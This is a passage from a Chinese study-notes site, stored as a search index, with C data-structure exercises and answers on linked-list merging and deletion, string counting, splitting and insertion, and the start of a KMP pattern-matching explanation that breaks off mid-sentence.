\u6700\u540e\uff0c\u8fd4\u56de\u65b0\u94fe\u8868\u7684\u5934\u6307\u9488\nstruct student* combine(struct student* h1, struct student* h2, char by) {\n    struct student* merged_head = h1;\n    struct student* tail = NULL; // \u521d\u59cb\u5316\u5c3e\u6307\u9488\u4e3aNULL\n    struct student* temp_1 = (struct student*)malloc(sizeof(struct student));\n    struct student* head_temp1;\n    struct student* head_temp2;\n\n\n    for (int i = 0; i &lt; N1-1; i++) {\n        h1 = h1-&gt;next;\n    }\n    h1 -&gt; next = h2;\n\n    //\u5982\u679c\u94fe\u8868\u4e3a\u7a7a\u76f4\u63a5\u8fd4\u56de\n    if (merged_head == NULL) {\n        return merged_head;\n    }\n\n    for (int i = 0; i &lt; N1 + N2 - 1; i++) {\n\n        //\u7ebf\u6027\u8868\u7684\u6392\u5e8f,\u91c7\u7528\u5192\u6ce1\u6392\u5e8f,\u76f4\u63a5\u904d\u5386\u94fe\u8868\n        //\u7528\u4e8e\u53d8\u91cf\u94fe\u8868\n        head_temp1 = merged_head;\n        head_temp2 = head_temp1-&gt;next;\n\n        for (int j = 0; j &lt; N1 + N2 - i - 1; j++) {\n\n            if (head_temp2 != NULL) {\n                //\u5982\u679c\u524d\u9762\u90a3\u4e2a\u7684score\u6bd4\u540e\u9762\u90a3\u4e2a\u7684score\u5927\uff0c\u5c31\u4ea4\u6362\u5b83\u4eec\u4e4b\u95f4\u7684\u6570\u636e\u57df\n                if ((by == 'D' &amp;&amp; head_temp1-&gt;score &gt;= head_temp2-&gt;score) \n                    || (by == 'U' &amp;&amp; head_temp1-&gt;score &lt;= head_temp2-&gt;score)) {\n\n                    temp_1-&gt;num = head_temp1-&gt;num;\n                    strcpy(temp_1-&gt;name, head_temp1-&gt;name);\n                    temp_1-&gt;score = head_temp1-&gt;score;\n\n                    head_temp1-&gt;num = head_temp2-&gt;num;\n                    strcpy(head_temp1-&gt;name, head_temp2-&gt;name);\n                    head_temp1-&gt;score = head_temp2-&gt;score;\n\n                    head_temp2-&gt;num = temp_1-&gt;num;\n                    strcpy(head_temp2-&gt;name, temp_1-&gt;name);\n                    head_temp2-&gt;score = temp_1-&gt;score;\n                }\n                head_temp1 = head_temp1-&gt;next;\n                head_temp2 = head_temp1-&gt;next;\n            }\n        }\n\n        head_temp1 = NULL;\n        head_temp2 = NULL;\n    }\n\n    free(head_temp1);\n    free(head_temp2);\n\n    return merged_head;\n}\n\n// \u8f93\u51fa\u5355\u94fe\u8868\u4e2d\u5b66\u751f\u4fe1\u606f\uff0c\u6bcf\u884c\u4e00\u4e2a\u5b66\u751f\u4fe1\u606f:\u5b66\u53f7 \u59d3\u540d \u6210\u7ee9\nvoid print(struct student* h) {\n    printf(\"\u5b66\u53f7\\t\u59d3\u540d\\t\u6210\u7ee9\\n\");\n    while (h != NULL) {\n        printf(\"%d\\t%s\\t%.2f\\n\", h-&gt;num, h-&gt;name, h-&gt;score);\n        h = h-&gt;next;\n    }\n    printf(\"\\n\");\n}\n\n// \u94fe\u8868\u4e2d\u5220\u9664stu\u7ed3\u70b9\n// \u63a5\u53d7\u4e00\u4e2a\u94fe\u8868\u7684\u5934\u6307\u9488head\u548c\u4e00\u4e2a\u5b66\u53f7num\u4f5c\u4e3a\u53c2\u6570\n// \u901a\u8fc7\u904d\u5386\u94fe\u8868\u627e\u5230\u8981\u5220\u9664\u7684\u8282\u70b9\uff0c\u5e76\u66f4\u65b0\u94fe\u8868\u7684\u6307\u9488\u8fde\u63a5\n// \u6700\u540e\uff0c\u91ca\u653e\u88ab\u5220\u9664\u8282\u70b9\u7684\u5185\u5b58\uff0c\u5e76\u8fd4\u56de\u94fe\u8868\u7684\u5934\u6307\u9488\nvoid delete(struct student* h, struct student stu) {\n    struct student* prev = NULL;\n    struct student* current = h;\n\n    // \u5bfb\u627e\u5f85\u5220\u9664\u8282\u70b9\u7684\u4f4d\u7f6e\n    while (current != NULL &amp;&amp; current-&gt;num != stu.num) {\n        prev = current;\n        current = current-&gt;next;\n    }\n\n    // \u5220\u9664\u8282\u70b9\n    if (current != NULL) {\n        if (prev == NULL) {\n            // \u5982\u679c\u662f\u5934\u8282\u70b9\n            h = current-&gt;next;\n        }\n        else {\n            prev-&gt;next = current-&gt;next;\n        }\n        free(current); // \u91ca\u653e\u5185\u5b58\n        //\u4e0d\u91ca\u653e\u5185\u5b58\u4f1a\u5bfc\u81f4\u5185\u5b58\u6cc4\u6f0f\uff0c\u7279\u522b\u662f\u5728\u4f7f\u7528\u52a8\u6001\u5185\u5b58\u5206\u914d\u7684\u60c5\u51b5\u4e0b\n        //\u5185\u5b58\u6cc4\u6f0f\u662f\u6307\u7a0b\u5e8f\u5728\u8fd0\u884c\u8fc7\u7a0b\u4e2d\u5206\u914d\u4e86\u4e00\u4e9b\u5185\u5b58\u7a7a\u95f4\n        //\u4f46\u5728\u4e0d\u518d\u9700\u8981\u4f7f\u7528\u8fd9\u4e9b\u7a7a\u95f4\u65f6\u672a\u5c06\u5176\u91ca\u653e\uff0c\u5bfc\u81f4\u7cfb\u7edf\u65e0\u6cd5\u56de\u6536\u8fd9\u4e9b\u5185\u5b58\n    }\n    else {\n        printf(\"\u672a\u627e\u5230\u8981\u5220\u9664\u7684\u8282\u70b9\\n\");\n    }\n}\n</code></pre>"},{"location":"DEC/Data-Structure/Alpha-%E4%B8%B2%E3%80%81%E6%95%B0%E7%BB%84%E3%80%81%E5%B9%BF%E4%B9%89%E8%A1%A8/","title":"Alpha \u4e32\u3001\u6570\u7ec4\u3001\u5e7f\u4e49\u8868","text":""},{"location":"DEC/Data-Structure/Alpha-%E4%B8%B2%E3%80%81%E6%95%B0%E7%BB%84%E3%80%81%E5%B9%BF%E4%B9%89%E8%A1%A8/#_1","title":"\u7edf\u8ba1\u5b57\u7b26\u4e32\u4e2d\u6570\u5b57\u548c\u5b57\u6bcd\u7684\u4e2a\u6570","text":"<p>\u8bf7\u6839\u636e\u6ce8\u91ca\u5b8c\u6210\u51fd\u6570 count\uff0c\u5b9e\u73b0\u7edf\u8ba1\u5b57\u7b26\u4e32\u4e2d\u6570\u5b57\uff080-9\uff09\u548c\u5b57\u6bcd\uff08A-Z,a-z\uff09\u51fa\u73b0\u7684\u4e2a\u6570\u7684\u529f\u80fd\u3002</p> <p>\u793a\u4f8b</p> Text Only<pre><code>\u5b57\u7b26\u4e32\uff1a\"abc11def001010DJK\"\n</code></pre> <p>\u8f93\u51fa</p> Text Only<pre><code>\u5b57\u6bcd\u4e2a\u6570:9\n\u6570\u5b57\u4e2a\u6570:8\n</code></pre>"},{"location":"DEC/Data-Structure/Alpha-%E4%B8%B2%E3%80%81%E6%95%B0%E7%BB%84%E3%80%81%E5%B9%BF%E4%B9%89%E8%A1%A8/#_2","title":"\u9898\u76ee","text":"C<pre><code>#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n\n//\u7edf\u8ba1\u8f93\u5165\u5b57\u7b26\u4e32\u4e2d\u51fa\u73b0\u7684A-Z\u53caa-z\u5b57\u7b26\u7684\u4e2a\u6570\n//\u7edf\u8ba1\u8f93\u5165\u5b57\u7b26\u4e32\u4e2d\u51fa\u73b0\u76840-9\u4e2a\u6570\u3002\n//s\uff1a\u8f93\u5165\u7684\u5b57\u7b26\u4e32\n//pzm:\u6307\u5411\u4fdd\u5b58A-Z\u548ca-z\u4e2a\u6570\u7684\u6574\u578b\u53d8\u91cf\u7684\u6307\u9488 \n//psz:\u6307\u5411\u4fdd\u5b580-9\u4e2a\u6570\u7684\u6574\u578b\u53d8\u91cf\u7684\u6307\u9488\n\nvoid count(char s[], int *pzm, int *psz)\n{\n\n}\n\nint main()\n{\n    char s[] = \"abc11def001010DJK\";\n    int zm = 0; //\u5b57\u7b26\u4e32\u4e2dA-Z\u6216a-z\u5b57\u7b26\u7684\u4e2a\u6570\n    int sz = 0; //\u5b57\u7b26\u4e32\u4e2d0-9\u7684\u4e2a\u6570\n    count(s,&amp;zm,&amp;sz); \n\n    printf(\"\u5b57\u6bcd\u4e2a\u6570:%d\\n\u6570\u5b57\u4e2a\u6570:%d\",zm,sz);\n\n    return 0;\n}\n</code></pre>"},{"location":"DEC/Data-Structure/Alpha-%E4%B8%B2%E3%80%81%E6%95%B0%E7%BB%84%E3%80%81%E5%B9%BF%E4%B9%89%E8%A1%A8/#_3","title":"\u7b54\u6848","text":"C<pre><code>void count(char s[], int* pzm, int* psz) {\n    // \u521d\u59cb\u5316\u5b57\u6bcd\u548c\u6570\u5b57\u7684\u4e2a\u6570\u4e3a 0\n    *pzm = 0;\n    *psz = 0;\n\n    // \u904d\u5386\u5b57\u7b26\u4e32\u4e2d\u7684\u6bcf\u4e2a\u5b57\u7b26\n    for (int i = 0; s[i] != '\\0'; i++) {\n        // \u68c0\u67e5\u5b57\u7b26\u662f\u5426\u662f\u5b57\u6bcd\n        if ((s[i] &gt;= 'A' &amp;&amp; s[i] &lt;= 'Z') || (s[i] &gt;= 'a' &amp;&amp; s[i] &lt;= 'z')) {\n            (*pzm)++;\n        }\n        // \u68c0\u67e5\u5b57\u7b26\u662f\u5426\u662f\u6570\u5b57\n        if (s[i] &gt;= '0' &amp;&amp; s[i] &lt;= '9') {\n            (*psz)++;\n        }\n    }\n}\n</code></pre>"},{"location":"DEC/Data-Structure/Alpha-%E4%B8%B2%E3%80%81%E6%95%B0%E7%BB%84%E3%80%81%E5%B9%BF%E4%B9%89%E8%A1%A8/#_4","title":"\u6807\u51c6\u7b54\u6848","text":"C<pre><code>void count(char s[], int* pzm, int* psz)\n{\n    int i = 0;\n    while (s[i] != '\\0') {\n        if (('0' &lt;= s[i]) &amp;&amp; (s[i] &lt;= '9')) {\n            (*psz)++;\n        } // \u6570\u5b57\n        else if (('a' &lt;= s[i] &amp;&amp; s[i] &lt;= 'z') || ('A' &lt;= s[i] &amp;&amp; s[i] &lt;= 'Z')) {\n            (*pzm)++;\n        } // \u5b57\u6bcd\n        i++;\n    }\n}\n</code></pre>"},{"location":"DEC/Data-Structure/Alpha-%E4%B8%B2%E3%80%81%E6%95%B0%E7%BB%84%E3%80%81%E5%B9%BF%E4%B9%89%E8%A1%A8/#_5","title":"\u5b57\u7b26\u4e32\u5206\u5272","text":"<p>\u8bf7\u5b8c\u6210\u51fd\u6570<code>part</code>\uff0c\u5b9e\u73b0\u5982\u4e0b\u529f\u80fd\uff1a\u7ed9\u5b9a\u5b57\u7b26\u4e32 s\uff0c\u6309\u7ed9\u5b9a\u7684\u957f\u5ea6 n \u5206\u5272\u6210\u4e24\u4e2a\u5b57\u7b26\u4e32\uff0c\u5b57\u7b26\u4e32 s \u7684\u524d n \u4e2a\u5b57\u7b26\u5b58\u5165 s1\uff0c\u5176\u591a\u4f59\u7684\u5b57\u7b26\u5b58\u5165 s2\u3002</p> <p>\u793a\u4f8b</p> Text Only<pre><code>\u5b57\u7b26\u4e32 s\uff1a\"abc123456789\"\n\u957f\u5ea6 n\uff1a5\n</code></pre> <p>\u8f93\u51fa</p> Text Only<pre><code>abc12\n3456789\n</code></pre>"},{"location":"DEC/Data-Structure/Alpha-%E4%B8%B2%E3%80%81%E6%95%B0%E7%BB%84%E3%80%81%E5%B9%BF%E4%B9%89%E8%A1%A8/#_6","title":"\u9898\u76ee","text":"C<pre><code>#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n\nvoid part(char *s, char *s1, char *s2, int n){\n    //\u8bf7\u5728\u6b64\u5904\u7f16\u5199\u4ee3\u7801\uff0c\u5b9e\u73b0\u9898\u76ee\u8981\u6c42\n\n\n}\n\nint main()\n{\n    char s[] = \"abc123456789\";\n    char s1[10],s2[10];\n    part(s,s1,s2,5); \n    printf(\"%s\\n%s\",s1,s2);\n    return 0;\n}\n</code></pre>"},{"location":"DEC/Data-Structure/Alpha-%E4%B8%B2%E3%80%81%E6%95%B0%E7%BB%84%E3%80%81%E5%B9%BF%E4%B9%89%E8%A1%A8/#_7","title":"\u7b54\u6848","text":"<p>\u7b2c\u4e00\u79cd\u65b9\u6cd5\uff0c\u76f4\u63a5\u7528<code>string.h</code>\uff0c\u6ce8\u610f<code>strncpy</code>\u548c<code>strcpy</code>\u7684\u533a\u522b\u3002</p> <p>\u533a\u522b\u5982\u4e0b\uff1a</p> <ol> <li>\u529f\u80fd\u4e0d\u540c\uff1a</li> <li><code>strncpy(destination, source, n)</code>\uff1a\u5c06\u6e90\u5b57\u7b26\u4e32 <code>source</code> \u7684\u524d <code>n</code> \u4e2a\u5b57\u7b26\u590d\u5236\u5230\u76ee\u6807\u5b57\u7b26\u4e32 <code>destination</code> \u4e2d\u3002\u5982\u679c <code>source</code> \u7684\u957f\u5ea6\u5c0f\u4e8e <code>n</code>\uff0c\u5219\u5728\u590d\u5236\u5b8c <code>source</code> \u7684\u5185\u5bb9\u540e\uff0c\u5c06\u5269\u4f59\u7684\u5b57\u7b26\u7528\u7a7a\u5b57\u7b26 <code>\\0</code> \u586b\u5145\u3002</li> <li> <p><code>strcpy(destination, source)</code>\uff1a\u5c06\u6e90\u5b57\u7b26\u4e32 <code>source</code> \u7684\u6240\u6709\u5b57\u7b26\u590d\u5236\u5230\u76ee\u6807\u5b57\u7b26\u4e32 <code>destination</code> \u4e2d\uff0c\u76f4\u5230\u9047\u5230\u7a7a\u5b57\u7b26 <code>\\0</code> \u4e3a\u6b62\u3002</p> </li> <li> <p>\u957f\u5ea6\u63a7\u5236\u4e0d\u540c\uff1a</p> </li> <li><code>strncpy</code> \u5141\u8bb8\u6307\u5b9a\u8981\u590d\u5236\u7684\u5b57\u7b26\u4e2a\u6570 <code>n</code>\uff0c\u5e76\u4e14\u5373\u4f7f <code>source</code> \u7684\u957f\u5ea6\u5c0f\u4e8e <code>n</code>\uff0c\u4e5f\u4f1a\u5728 <code>destination</code> \u4e2d\u586b\u5145\u7a7a\u5b57\u7b26 <code>\\0</code>\uff0c\u4ee5\u4fdd\u8bc1 <code>destination</code> \u7684\u957f\u5ea6\u4e3a <code>n</code>\u3002</li> <li> <p><code>strcpy</code> \u6ca1\u6709\u6307\u5b9a\u8981\u590d\u5236\u7684\u5b57\u7b26\u4e2a\u6570\uff0c\u5b83\u4f1a\u4e00\u76f4\u590d\u5236\u76f4\u5230\u9047\u5230 <code>source</code> \u7684\u7a7a\u5b57\u7b26 <code>\\0</code>\uff0c\u56e0\u6b64 <code>destination</code> \u7684\u957f\u5ea6\u53d6\u51b3\u4e8e <code>source</code> \u7684\u957f\u5ea6\u3002</p> </li> <li> <p>\u5b89\u5168\u6027\u4e0d\u540c\uff1a</p> </li> <li><code>strncpy</code> \u5728\u590d\u5236 <code>source</code> \u7684\u524d <code>n</code> \u4e2a\u5b57\u7b26\u65f6\uff0c\u4e0d\u4f1a\u68c0\u67e5 <code>source</code> \u7684\u5b9e\u9645\u957f\u5ea6\uff0c\u56e0\u6b64\u53ef\u80fd\u51fa\u73b0\u672a\u590d\u5236\u5b8c\u6574\u5b57\u7b26\u4e32\u6216\u672a\u586b\u5145\u8db3\u591f\u7684\u7a7a\u5b57\u7b26\u7684\u60c5\u51b5\u3002\u8fd9\u53ef\u80fd\u5bfc\u81f4\u76ee\u6807\u5b57\u7b26\u4e32 <code>destination</code> \u4e0d\u662f\u4e00\u4e2a\u6709\u6548\u7684 C \u5b57\u7b26\u4e32\u3002</li> <li><code>strcpy</code> \u4f1a\u590d\u5236\u6e90\u5b57\u7b26\u4e32 <code>source</code> \u7684\u6240\u6709\u5b57\u7b26\uff0c\u76f4\u5230\u9047\u5230\u7a7a\u5b57\u7b26 <code>\\0</code>\u3002\u5b83\u4f1a\u4fdd\u8bc1\u76ee\u6807\u5b57\u7b26\u4e32 <code>destination</code> \u662f\u4e00\u4e2a\u6709\u6548\u7684 C \u5b57\u7b26\u4e32\uff0c\u4e14\u4ee5\u7a7a\u5b57\u7b26\u7ed3\u5c3e\u3002</li> </ol> <p>\u603b\u7684\u6765\u8bf4\uff0c<code>strncpy</code> \u5728\u9700\u8981\u63a7\u5236\u590d\u5236\u5b57\u7b26\u4e2a\u6570\u7684\u60c5\u51b5\u4e0b\u6bd4\u8f83\u6709\u7528\uff0c\u4f46\u9700\u8981\u5c0f\u5fc3\u5904\u7406\u5b57\u7b26\u4e32\u7ed3\u675f\u7b26\u7684\u60c5\u51b5\u3002\u800c <code>strcpy</code> \u5219\u662f\u5e38\u7528\u7684\u5b57\u7b26\u4e32\u590d\u5236\u51fd\u6570\uff0c\u9002\u7528\u4e8e\u590d\u5236\u6574\u4e2a\u5b57\u7b26\u4e32\u7684\u573a\u666f\uff0c\u5e76\u786e\u4fdd\u76ee\u6807\u5b57\u7b26\u4e32\u662f\u4e00\u4e2a\u6709\u6548\u7684 C \u5b57\u7b26\u4e32\u3002</p> C<pre><code>#include &lt;string.h&gt; // \u522b\u5fd8\u4e86\u8fd9\u4e2a\n\nvoid part(char* s, char* s1, char* s2, int n) {\n    // \u5c06 s \u7684\u524d n \u4e2a\u5b57\u7b26\u590d\u5236\u5230 s1\n    strncpy(s1, s, n);\n    s1[n] = '\\0'; // \u8bbe\u7f6e s1 \u7684\u672b\u5c3e\u4e3a\u5b57\u7b26\u4e32\u7ed3\u675f\u7b26\n\n    // \u5c06 s \u4e2d\u5269\u4f59\u7684\u5b57\u7b26\u590d\u5236\u5230 s2\n    strcpy(s2, s + n);\n}\n</code></pre> <p>\u7b2c\u4e8c\u79cd\u65b9\u6cd5\uff0c\u624b\u52a8\u5b9e\u73b0<code>string.h</code>\u529f\u80fd\u3002</p> C<pre><code>void part(char* s, char* s1, char* s2, int n) {\n    int i;\n\n    // \u590d\u5236 s \u7684\u524d n \u4e2a\u5b57\u7b26\u5230 s1\n    for (i = 0; i &lt; n &amp;&amp; s[i] != '\\0'; i++) {\n        s1[i] = s[i];\n    }\n    s1[i] = '\\0'; // \u8bbe\u7f6e s1 \u7684\u672b\u5c3e\u4e3a\u5b57\u7b26\u4e32\u7ed3\u675f\u7b26\n\n    // \u590d\u5236 s \u4e2d\u5269\u4f59\u7684\u5b57\u7b26\u5230 s2\n    for (int j = 0; s[i] != '\\0'; i++, j++) {\n        s2[j] = s[i];\n    }\n    s2[i - n] = '\\0'; // \u8bbe\u7f6e s2 \u7684\u672b\u5c3e\u4e3a\u5b57\u7b26\u4e32\u7ed3\u675f\u7b26\n    // \u53ef\u6709\u53ef\u65e0\n}\n</code></pre>"},{"location":"DEC/Data-Structure/Alpha-%E4%B8%B2%E3%80%81%E6%95%B0%E7%BB%84%E3%80%81%E5%B9%BF%E4%B9%89%E8%A1%A8/#_8","title":"\u6807\u51c6\u7b54\u6848\uff08\u4e0d\u592a\u597d\uff09","text":"C<pre><code>void part(char* s, char* s1, char* s2, int n)\n{\n    char* p = s, * q = s1;\n    int i = 0;\n    if (*p == '\\0') {//s\u4e3a\u7a7a \n        return;\n    }\n\n    //s1 \n    while (*p != '\\0' &amp;&amp; i &lt; n) {\n        *q = *p;\n        q++;\n        p++;\n        i++;\n    }\n    *q = '\\0';\n    if (*p == '\\0') {\n        return;\n    }\n\n    //s2    \n    q = s2;\n    while (*p != '\\0') {\n        *q = *p;\n        q++;\n        p++;\n    }\n    *q = '\\0';\n}\n</code></pre>"},{"location":"DEC/Data-Structure/Alpha-%E4%B8%B2%E3%80%81%E6%95%B0%E7%BB%84%E3%80%81%E5%B9%BF%E4%B9%89%E8%A1%A8/#_9","title":"\u5b57\u7b26\u4e32\u7684\u63d2\u5165","text":"<p>\u8bf7\u5b8c\u6210\u51fd\u6570<code>insert</code>\uff0c\u5b9e\u73b0\u5982\u4e0b\u529f\u80fd\uff1a\u5c06\u5b57\u7b26\u4e32 t \u63d2\u5165\u5230\u5b57\u7b26\u4e32 s \u4e2d\uff0c\u63d2\u5165\u4f4d\u7f6e\u4e3a pos\u3002</p> <p>\u793a\u4f8b</p> Text Only<pre><code>\u5b57\u7b26\u4e32s\uff1a\"1234567890\"\n\u5b57\u7b26\u4e32t\uff1a\"abcd\"\n\u63d2\u5165\u4f4d\u7f6epos\uff1a6\n</code></pre> <p>\u8f93\u51fa</p> Text Only<pre><code>12345abcd67890\n</code></pre>"},{"location":"DEC/Data-Structure/Alpha-%E4%B8%B2%E3%80%81%E6%95%B0%E7%BB%84%E3%80%81%E5%B9%BF%E4%B9%89%E8%A1%A8/#_10","title":"\u9898\u76ee","text":"C<pre><code>#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n\nvoid  insert(char *s,char *t,int pos){\n    //\u8bf7\u5728\u6b64\u5904\u7f16\u5199\u4ee3\u7801,\u5b8c\u6210\u9898\u76ee\u8981\u6c42\n\n\n}\n\nint main()\n{\n    char s[20] = \"1234567890\";\n    char t[20] = \"abcd\";\n    insert(s,t,6);\n    printf(\"%s\",s);\n    return 0;\n}\n</code></pre>"},{"location":"DEC/Data-Structure/Alpha-%E4%B8%B2%E3%80%81%E6%95%B0%E7%BB%84%E3%80%81%E5%B9%BF%E4%B9%89%E8%A1%A8/#_11","title":"\u7b54\u6848","text":"C<pre><code>void insert(char* s, char* t, int pos) {\n    int len_s = 0;\n    int len_t = 0;\n\n    // \u8ba1\u7b97\u5b57\u7b26\u4e32 s \u548c t \u7684\u957f\u5ea6\n    while (s[len_s] != '\\0') {\n        len_s++;\n    }\n    while (t[len_t] != '\\0') {\n        len_t++;\n    }\n\n    // \u56e0\u4e3a\u9996\u5143\u7d20\u4e0b\u6807\u4e3a\u20181\u2019\n    pos--;\n\n    // \u8fd9\u4e00\u6bb5\u53ef\u6709\u53ef\u65e0\n    // \u68c0\u67e5\u63d2\u5165\u4f4d\u7f6e\u662f\u5426\u8d85\u51fa s \u7684\u957f\u5ea6\u8303\u56f4\n    // \u5982\u679c pos \u5927\u4e8e len_s\uff0c\u5219\u5c06 pos \u8bbe\u7f6e\u4e3a len_s\n    // \u4ee5\u786e\u4fdd\u63d2\u5165\u4f4d\u7f6e\u4e0d\u4f1a\u8d85\u51fa\u5b57\u7b26\u4e32 s \u7684\u672b\u5c3e\u3002\n    if (pos &gt; len_s) {\n        pos = len_s;\n    }\n\n    // \u4e3a t \u4e2d\u7684\u5b57\u7b26\u817e\u51fa\u7a7a\u95f4\uff0c\u79fb\u52a8\u539f\u6765\u7684\u5b57\u7b26\u5411\u540e\n    for (int i = len_s; i &gt;= pos; i--) {\n        s[i + len_t] = s[i];\n    }\n\n    // \u5c06 t \u4e2d\u7684\u5b57\u7b26\u590d\u5236\u5230\u63d2\u5165\u4f4d\u7f6e\u5f00\u59cb\u7684\u4f4d\u7f6e\n    for (int i = 0; i &lt; len_t; i++) {\n        s[pos + i] = t[i];\n    }\n\n    // \u5728 s \u7684\u672b\u5c3e\u6dfb\u52a0\u5b57\u7b26\u4e32\u7ed3\u675f\u7b26\n    s[len_s + len_t] = '\\0';\n}\n</code></pre>"},{"location":"DEC/Data-Structure/Alpha-%E4%B8%B2%E3%80%81%E6%95%B0%E7%BB%84%E3%80%81%E5%B9%BF%E4%B9%89%E8%A1%A8/#_12","title":"\u6807\u51c6\u7b54\u6848\uff08\u4e0d\u592a\u597d\uff09","text":"C<pre><code>void  insert(char* s, char* t, int pos)\n{\n    int i = 1, x = 0, j;\n    char* p = s, * q = t;\n    if (pos &lt; 1) {\n        return;\n    }\n    while (*p != '\\0' &amp;&amp; i &lt; pos) {\n        p++;\n        i++;\n    }\n    if (*p == '\\0') {\n        return;\n    }\n    else\n        while (*p != '\\0') {\n            p++;\n            i++;\n        }\n    while (*q != '\\0') {\n        q++;\n        x++;\n    }\n    for (j = i; j &gt;= pos; j--) {\n        *(p + x) = *p;\n        p--;\n    }\n    q--;\n\n    for (j = 1; j &lt;= x; j++) {\n        *(p + x) = *q;\n        p--;\n        q--;\n    }\n}\n</code></pre>"},{"location":"DEC/Data-Structure/Alpha-%E4%B8%B2%E3%80%81%E6%95%B0%E7%BB%84%E3%80%81%E5%B9%BF%E4%B9%89%E8%A1%A8/#kmp","title":"KMP\u6a21\u5f0f\u5339\u914d\uff08\u5f85\u5b8c\u6210\uff09","text":"<p>\u8bf7\u7f16\u5199\u6a21\u5f0f\u5339\u914d\u51fd\u6570<code>KMP</code>\uff0c\u501f\u52a9 KMP \u7b97\u6cd5\u6765\u5b9e\u73b0\u5982\u4e0b\u529f\u80fd\uff1a\u5982\u679c\u5339\u914d\u6210\u529f\uff0c\u5219\u8fd4\u56de\u5bf9\u5e94\u7684\u4f4d\u7f6e\uff1b\u5982\u679c\u5339\u914d\u4e0d\u6210\u529f\uff0c\u5219\u8fd4\u56de-1\u3002</p>"},{"location":"DEC/Data-Structure/Alpha-%E4%B8%B2%E3%80%81%E6%95%B0%E7%BB%84%E3%80%81%E5%B9%BF%E4%B9%89%E8%A1%A8/#1","title":"\u793a\u4f8b 1","text":"<p>\u8c03\u7528\u51fd\u6570</p> Text Only<pre><code>KMP(\"aabaabbaaabab\",\"aaab\")\n</code></pre> <p>\u8f93\u51fa</p> Text Only<pre><code>8\n</code></pre>"},{"location":"DEC/Data-Structure/Alpha-%E4%B8%B2%E3%80%81%E6%95%B0%E7%BB%84%E3%80%81%E5%B9%BF%E4%B9%89%E8%A1%A8/#2","title":"\u793a\u4f8b 2","text":"<p>\u8c03\u7528\u51fd\u6570</p> Text Only<pre><code>KMP(\"aabaabbaaabab\",\"aaabbb\")\n</code></pre> <p>\u8f93\u51fa</p> Text Only<pre><code>-1\n</code></pre>"},{"location":"DEC/Data-Structure/Alpha-%E4%B8%B2%E3%80%81%E6%95%B0%E7%BB%84%E3%80%81%E5%B9%BF%E4%B9%89%E8%A1%A8/#_13","title":"\u9898\u76ee","text":"C<pre><code>#include &lt;stdio.h&gt;\n#include &lt;string.h&gt;\n\n//\u5339\u914d\u6210\u529f\uff0c\u5219\u51fd\u6570\u8fd4\u56de\u4f4d\u7f6e\nint KMP(char * S,char * T){\n\n}\nint main() {\n    int i=KMP(\"aabaabbaaabab\",\"aaab\");\n    printf(\"%d\",i);\n    return 0;\n}\n</code></pre>"},{"location":"DEC/Data-Structure/Alpha-%E4%B8%B2%E3%80%81%E6%95%B0%E7%BB%84%E3%80%81%E5%B9%BF%E4%B9%89%E8%A1%A8/#_14","title":"\u7b54\u6848","text":"<p>\u6784\u5efa<code>next</code>\u6570\u7ec4\u7684\u65f6\u5019<code>int next[len_t];</code>\uff0cVS\u4f1a\u62a5\u9519\uff0c\u201cE0028\uff1a\u8868\u8fbe\u5f0f\u5fc5\u987b\u542b\u6709\u5e38\u91cf\u503c\u201d\u3002\u89e3\u51b3\u65b9\u6cd5\u561b\uff0c\u8981\u4e48\u52a8\u6001\u5206\u914d\u5185\u5b58\uff0c\u8981\u4e48\u5c31\u76f4\u63a5\u586b\u4e2a<code>next[100]</code>\u7b97\u4e86\u3002</p> <p>\u5982\u679cVS\u62a5\u9519\uff1a\u201cE0167\uff1a<code>const char *</code>\u7c7b\u578b\u7684\u5b9e\u53c2\u4e0e<code>char *</code>\u7c7b\u578b\u7684\u5f62\u53c2\u4e0d\u517c\u5bb9\u201d\uff0c\u5219\u8bf7\u5c06\u6587\u4ef6\u540e\u7f00\u7531<code>.cpp</code>\u6539\u4e3a<code>.c</code>\u3002</p> <p>\u4e0b\u9762\u8fd9\u4e2a\u7684<code>next[]</code>\u9996\u5143\u7d20\u662f<code>-1</code>\uff0c\u548c\u4e0a\u8bfe\u7684<code>0</code>\u6709\u4e9b\u8bb8\u533a\u522b\u3002\u4e0d\u8fc7\u90fd\u4e00\u6837\u3002</p> <p>\u8fd9\u4e2a\u8ba1\u7b97\u7684\u662f\u201c\u9996\u5143\u7d20\u4e0b\u6807\u4e3a0\u201d\uff0c\u4f46\u662f\u9898\u76ee\u8981\u6c42\u7684\u662f\u201c\u9996\u5143\u7d20\u662f\u4e0b\u6807\u4e3a1\u201d\uff0c\u6240\u4ee5\u6700\u540ereturn\u7684\u65f6\u5019\u9700\u8981+1\u3002</p> <p>\u4e3a\u4e86\u5b9e\u73b0<code>KMP</code>\u7b97\u6cd5\u6765\u8fdb\u884c\u6a21\u5f0f\u5339\u914d\uff0c\u5e76\u8fd4\u56de\u5339\u914d\u6210\u529f\u7684\u4f4d\u7f6e\u6216 -1\uff0c\u53ef\u4ee5\u6309\u7167\u4ee5\u4e0b\u6b65\u9aa4\u5b8c\u6210 <code>KMP</code> \u51fd\u6570\uff1a</p> <ol> <li>\u8ba1\u7b97\u6a21\u5f0f\u5b57\u7b26\u4e32 <code>T</code> \u7684\u957f\u5ea6\u3002</li> <li>\u521b\u5efa\u8f85\u52a9\u6570\u7ec4 <code>next</code>\uff0c\u7528\u4e8e\u5b58\u50a8\u6a21\u5f0f\u5b57\u7b26\u4e32\u4e2d\u6bcf\u4e2a\u4f4d\u7f6e\u524d\u7f00\u7684\u6700\u957f\u53ef\u5339\u914d\u524d\u7f00\u5b50\u4e32\u7684\u7ed3\u675f\u4f4d\u7f6e\u3002</li> <li>\u6839\u636e\u6a21\u5f0f\u5b57\u7b26\u4e32 <code>T</code> \u6784\u5efa <code>next</code> \u6570\u7ec4\u3002</li> <li>\u521d\u59cb\u5316 <code>next[0]</code> \u4e3a <code>-1</code>\u3002</li> <li>\u521d\u59cb\u5316\u4e24\u4e2a\u6307\u9488 <code>i</code> \u548c <code>j</code>\uff0c\u5176\u4e2d <code>i = 0</code>\uff0c<code>j = -1</code>\u3002</li> <li>\u901a\u8fc7\u6bd4\u8f83 <code>T[i]</code> \u548c <code>T[j]</code> \u7684\u5b57\u7b26\u6765\u66f4\u65b0 <code>next[i+1]</code>\uff1a<ul> <li>\u5982\u679c <code>T[i]</code> \u548c <code>T[j]</code> \u76f8\u7b49\uff0c\u5219\u5c06 <code>next[i+1]</code> \u8bbe\u7f6e\u4e3a <code>next[j] + 